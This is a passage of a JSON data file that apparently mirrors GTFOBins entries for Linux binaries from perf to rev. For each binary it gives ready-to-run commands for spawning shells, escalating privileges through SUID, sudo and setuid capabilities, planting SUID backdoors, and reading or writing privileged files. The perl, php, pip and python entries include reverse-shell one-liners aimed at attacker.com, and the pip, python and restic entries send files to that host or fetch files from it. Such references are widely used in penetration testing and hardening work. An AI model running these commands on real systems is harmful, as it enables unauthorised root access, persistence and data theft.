        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nperf stat /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which perf) .\n\n./perf stat /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo perf stat /bin/sh"
      }
    ]
  },
  {
    "id": 203,
    "bin": "perl",
    "url": "/gtfobins/perl/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nperl -e 'exec \"/bin/sh\";'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nperl -e 'use Socket;$i=\"$ENV{RHOST}\";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nperl -ne print $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which perl) .\n\n./perl -e 'exec \"/bin/sh\";'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo perl -e 'exec \"/bin/sh\";'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\ncp $(which perl) .\nsudo setcap cap_setuid+ep perl\n\n./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
      }
    ]
  },
  {
    "id": 204,
    "bin": "pg",
    "url": "/gtfobins/pg/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npg /etc/profile\n!/bin/sh\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\npg file_to_read\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which pg) .\n\n./pg file_to_read\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo pg /etc/profile\n!/bin/sh"
      }
    ]
  },
  {
    "id": 205,
    "bin": "php",
    "url": "/gtfobins/php/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nexport CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n\n\nexport CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'\n\n\nexport CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'\n\n\nexport CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\\\n\",$r));'\n\n\nexport CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'\n\n"
      },
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nexport CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nServe files in the local folder running an HTTP server. This requires PHP version 5.4 or later.\nLHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nwrite data to a file, filename should be absolute.\nexport LFILE=file_to_write\nphp -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nexport LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which php) .\n\nCMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nCMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\ncp $(which php) .\nsudo setcap cap_setuid+ep php\n\nCMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\""
      }
    ]
  },
  {
    "id": 206,
    "bin": "pic",
    "url": "/gtfobins/pic/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npic -U\n.PS\nsh X sh X\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe output is prefixed with a some content as a header.\nLFILE=file_to_read\npic $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo pic -U\n.PS\nsh X sh X\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which pic) .\n\n./pic -U\n.PS\nsh X sh X"
      }
    ]
  },
  {
    "id": 207,
    "bin": "pico",
    "url": "/gtfobins/pico/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npico\n^R^X\nreset; sh 1>&0 2>&0\n\n\nThe SPELL environment variable can be used in place of the -s option if the command line cannot be changed.\npico -s /bin/sh\n/bin/sh\n^T\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\npico file_to_write\nDATA\n^O\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\npico file_to_read\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo pico\n^R^X\nreset; sh 1>&0 2>&0\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThe SPELL environment variable can be used in place of the -s option if the command line cannot be changed.\nsudo install -m =xs $(which pico) .\n\n./pico -s /bin/sh\n/bin/sh\n^T"
      }
    ]
  },
  {
    "id": 208,
    "bin": "pidstat",
    "url": "/gtfobins/pidstat/",
    "funcs": [
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nCOMMAND=id\npidstat -e $COMMAND\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which pidstat) .\n\nCOMMAND=id\n./pidstat -e $COMMAND\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nCOMMAND=id\nsudo pidstat -e $COMMAND"
      }
    ]
  },
  {
    "id": 209,
    "bin": "pip",
    "url": "/gtfobins/pip/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\npip install $TF\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")' > $TF/setup.py\npip install $TF\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))' > $TF/setup.py\npip install $TF\n\n\nServe files in the local folder running an HTTP server.\nexport LPORT=8888\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py\npip install $TF\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request. It needs an absolute local file path.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > $TF/setup.py\npip install $TF\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nIt needs an absolute local file path.\nexport LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file content is corrupted as wrapped within an exception error.\nTF=$(mktemp -d)\necho 'raise Exception(open(\"file_to_read\").read())' > $TF/setup.py\npip install $TF\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nTF=$(mktemp -d)\necho 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > $TF/setup.py\npip install $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF"
      }
    ]
  },
  {
    "id": 210,
    "bin": "pkexec",
    "url": "/gtfobins/pkexec/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo pkexec /bin/sh"
      }
    ]
  },
  {
    "id": 211,
    "bin": "pkg",
    "url": "/gtfobins/pkg/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nIt runs commands using a specially crafted FreeBSD package. Generate it with fpm and upload it to the target.\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n\nsudo pkg install -y --no-repo-update ./x-1.0.txz"
      }
    ]
  },
  {
    "id": 212,
    "bin": "pr",
    "url": "/gtfobins/pr/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\npr -T $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which pr) .\n\nLFILE=file_to_read\npr -T $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\npr -T $LFILE"
      }
    ]
  },
  {
    "id": 213,
    "bin": "pry",
    "url": "/gtfobins/pry/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npry\nsystem(\"/bin/sh\")\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo pry\nsystem(\"/bin/sh\")\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which pry) .\n\n./pry\nsystem(\"/bin/sh\")"
      }
    ]
  },
  {
    "id": 214,
    "bin": "psftp",
    "url": "/gtfobins/psftp/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npsftp\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo psftp\n!/bin/sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which psftp) .\n\nsudo psftp\n!/bin/sh"
      }
    ]
  },
  {
    "id": 215,
    "bin": "psql",
    "url": "/gtfobins/psql/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npsql\n\\?\n!/bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\npsql\n\\?\n!/bin/sh"
      }
    ]
  },
  {
    "id": 216,
    "bin": "ptx",
    "url": "/gtfobins/ptx/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nptx -w 5000 \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which ptx) .\n\nLFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\""
      }
    ]
  },
  {
    "id": 217,
    "bin": "puppet",
    "url": "/gtfobins/puppet/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npuppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe file path must be absolute.\nLFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\"\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file content is corrupted by the diff output format. The actual /usr/bin/diff command is executed.\nLFILE=file_to_read\npuppet filebucket -l diff /dev/null $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
      }
    ]
  },
  {
    "id": 218,
    "bin": "python",
    "url": "/gtfobins/python/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npython -c 'import os; os.system(\"/bin/sh\")'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file via \u201cd\u201d parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.\nexport URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n\n\nServe files in the local folder running an HTTP server.\nexport LPORT=8888\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\npython -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\npython -c 'print(open(\"file_to_read\").read())'\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which python) .\n\n./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo python -c 'import os; os.system(\"/bin/sh\")'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\ncp $(which python) .\nsudo setcap cap_setuid+ep python\n\n./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
      }
    ]
  },
  {
    "id": 219,
    "bin": "rake",
    "url": "/gtfobins/rake/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nrake -p '`/bin/sh 1>&0`'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file is actually parsed and the first wrong line is returned in an error message.\nLFILE=file-to-read\nrake -f $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo rake -p '`/bin/sh 1>&0`'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which rake) .\n\n./rake -p '`/bin/sh 1>&0`'"
      }
    ]
  },
  {
    "id": 220,
    "bin": "readelf",
    "url": "/gtfobins/readelf/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nreadelf -a @$LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which readelf) .\n\nLFILE=file_to_read\n./readelf -a @$LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo readelf -a @$LFILE"
      }
    ]
  },
  {
    "id": 221,
    "bin": "red",
    "url": "/gtfobins/red/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nred file_to_write\na\nDATA\n.\nw\nq\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nred file_to_read\n,p\nq\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo red file_to_write\na\nDATA\n.\nw\nq"
      }
    ]
  },
  {
    "id": 222,
    "bin": "redcarpet",
    "url": "/gtfobins/redcarpet/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nredcarpet \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo redcarpet \"$LFILE\""
      }
    ]
  },
  {
    "id": 223,
    "bin": "restic",
    "url": "/gtfobins/restic/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nrestic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which restic) .\n\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
      }
    ]
  },
  {
    "id": 224,
    "bin": "rev",
    "url": "/gtfobins/rev/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nrev $LFILE | rev\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which rev) .\n\nLFILE=file_to_read\n./rev $LFILE | rev\n\n"
      },
      {
        "func": "Sudo",
